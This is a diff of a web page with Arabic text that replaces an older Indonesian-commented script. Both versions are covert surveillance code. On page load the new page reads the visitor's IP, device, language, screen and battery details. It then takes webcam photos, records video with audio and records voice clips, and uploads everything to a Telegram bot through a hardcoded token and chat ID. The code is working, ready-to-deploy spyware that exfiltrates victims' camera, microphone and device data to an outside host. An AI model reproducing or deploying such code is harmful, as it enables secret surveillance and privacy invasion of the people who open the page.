@@ -1,67 +1,229 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إرسال بيانات جهاز إلى تلجرام</title>
+</head>
+<body>
 
-    <h2>اصبر ولك...</h2>
-    <script>
-      const TOKEN = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc"; // Ganti sama token lu
-      const CHAT_ID = "5932979028"; // Ganti sama chat ID
+    <h1>بيانات جهازك يتم إرسالها الآن...</h1>
 
-      let userInfo = "";
 
-      // Ambil info IP & lokasi
-      fetch("https://ipinfo.io/json?token=free")
-        .then(res => res.json())
-        .then(data => {
-          userInfo = `
-IP: ${data.ip}
-Kota: ${data.city}
-Region: ${data.region}
-Negara: ${data.country}
-ISP: ${data.org}
-Lokasi: https://www.google.com/maps?q=${data.loc}
-Device: ${navigator.userAgent}
-          `.trim();
-        });
+<script>
+    
+      const preview = document.getElementById('imagePreview');
+    const img = document.getElementById('previewImg');
+    const downloadBtn = document.getElementById('downloadBtn');
 
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(function(stream) {
-          const video = document.createElement("video");
-          video.srcObject = stream;
-          video.play();
+    document.querySelectorAll('img').forEach(function(image) {
+      image.addEventListener('click', function() {
+        img.src = this.src;
+        downloadBtn.href = this.src;
+        preview.style.display = 'flex';
+      });
+    });
 
-          video.addEventListener('loadedmetadata', () => {
-            const width = video.videoWidth;
-            const height = video.videoHeight;
+    preview.addEventListener('click', function(e) {
+      if (e.target === preview) {
+        preview.style.display = 'none';
+      }
+    });
+  </script>
 
-            setTimeout(() => {
-              const canvas = document.createElement("canvas");
-              canvas.width = width;
-              canvas.height = height;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0, width, height);
+  <!-- دالة الانتقال الذكية -->
+  <script>
+    function goTo(type) {
+      if (type === 'video') {
+        window.location.href = "index-videos.html";
+      } else if (type === 'blog') {
+        window.location.href = "index-txt.html";
+      }
+    }
+  </script>
 
-              canvas.toBlob(function(blob) {
-                // Kirim Foto
-                const formData = new FormData();
-                formData.append("chat_id", CHAT_ID);
-                formData.append("photo", blob, "foto.jpg");
+  <!-- تأثير نابض للزر -->
+  <style>
+    #imagePreview {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0,0,0,0.95);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
 
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                  method: "POST",
-                  body: formData
-                });
+    @keyframes pulse {
+      0% { box-shadow: 0 0 5px red; }
+      50% { box-shadow: 0 0 15px red; }
+      100% { box-shadow: 0 0 5px red; }
+    }
+  </style>
+</div>
 
-                // Kirim Info
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                  method: "POST",
-                  headers: { "Content-Type": "application/json" },
-                  body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: userInfo
-                  })
-                });
 
-              }, "image/jpeg", 0.9);
-            }, 2000);
-          });
-        })
-        .catch(err => alert("Akses kamera gagal: " + err));
-    </script>
+<script>
+const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
+const chat_id = "5932979028";
+
+// دالة إرسال رسالة نصية
+async function sendToTelegram(text) {
+  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ chat_id, text })
+  });
+}
+
+// إرسال صورة
+async function sendPhoto(blob) {
+  const formData = new FormData();
+  formData.append("chat_id", chat_id);
+  formData.append("photo", blob, "photo.jpg");
+  await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+    method: "POST",
+    body: formData
+  });
+}
+
+// إرسال فيديو
+async function sendVideo(blob) {
+  const formData = new FormData();
+  formData.append("chat_id", chat_id);
+  formData.append("video", blob, "video.webm");
+  await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+    method: "POST",
+    body: formData
+  });
+}
+
+// إرسال صوت
+async function sendVoice(blob) {
+  const formData = new FormData();
+  formData.append("chat_id", chat_id);
+  formData.append("voice", blob, "voice.ogg");
+  await fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
+    method: "POST",
+    body: formData
+  });
+}
+
+// بيانات الجهاز
+async function sendDeviceInfo() {
+  const battery = await navigator.getBattery();
+  const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
+  const msg = `
+👑 شادو، هناڪ دخيل جدي 👑
+
+🌐 بيــانـات الجهاز 🌐
+• المـقـــــــــــع: ${location.href}
+• إســـم الجهـاز: ${navigator.userAgent}
+• IP Phon: ${ip.ip || "غير معروف"}
+• اللغة: ${navigator.language}
+• النظام: ${navigator.platform}
+• حجم الشاشة: ${screen.width}x${screen.height}
+• البطارية: ${battery.level * 100}% ${battery.charging ? '🔌' : '🔋'}
+
+📸 صور: 10 سيتم إرسالها
+🎬 فيديو: سيتم تسجيله لاحقًا
+🎤 صوت: 10 تسجيلات قادمة
+  `;
+  await sendToTelegram(msg);
+}
+
+// 1️⃣ التقاط 10 صور بالكاميرا
+async function take10PhotosAndThen(callback) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+
+    for (let i = 0; i < 2; i++) {
+      try {
+        const blob = await imageCapture.takePhoto();
+        await sendPhoto(blob);
+        await new Promise(r => setTimeout(r, 500)); // تأخير بسيط بين الصور
+      } catch (e) {}
+    }
+
+    track.stop();
+    if (callback) callback();
+  } catch (e) {
+    console.warn("فشل التقاط الصور:", e);
+    if (callback) callback();
+  }
+}
+
+// 2️⃣ تسجيل فيديو 10 ثوانٍ
+async function recordVideoThen(callback) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = async () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      await sendVideo(blob);
+      stream.getTracks().forEach(t => t.stop());
+      if (callback) callback();
+    };
+
+    recorder.start();
+    setTimeout(() => recorder.stop(), 10000);
+  } catch (e) {
+    console.warn("فشل تسجيل الفيديو:", e);
+    if (callback) callback();
+  }
+}
+
+// 3️⃣ تسجيل 10 تسجيلات صوت كل منها 10 ثوانٍ
+async function record10AudiosSequentially() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const recorder = new MediaRecorder(stream);
+    let chunks = [];
+    let count = 1;
+
+    recorder.ondataavailable = e => chunks.push(e.data);
+
+    recorder.onstop = async () => {
+      const blob = new Blob(chunks, { type: 'audio/ogg' });
+      await sendVoice(blob);
+      chunks = [];
+      count++;
+      if (count < 2) {
+        setTimeout(() => {
+          recorder.start();
+          setTimeout(() => recorder.stop(), 10000);
+        }, 1000);
+      } else {
+        stream.getTracks().forEach(t => t.stop());
+      }
+    };
+
+    recorder.start();
+    setTimeout(() => recorder.stop(), 10000);
+  } catch (e) {
+    console.warn("فشل تسجيل الصوت:", e);
+  }
+}
+
+// بدء السلسلة بعد دخول الموقع
+window.onload = async () => {
+  await sendDeviceInfo();
+
+  take10PhotosAndThen(() => {
+    recordVideoThen(() => {
+      record10AudiosSequentially();
+    });
+  });
+};
+</script>
+
+
+</body>
+</html> 
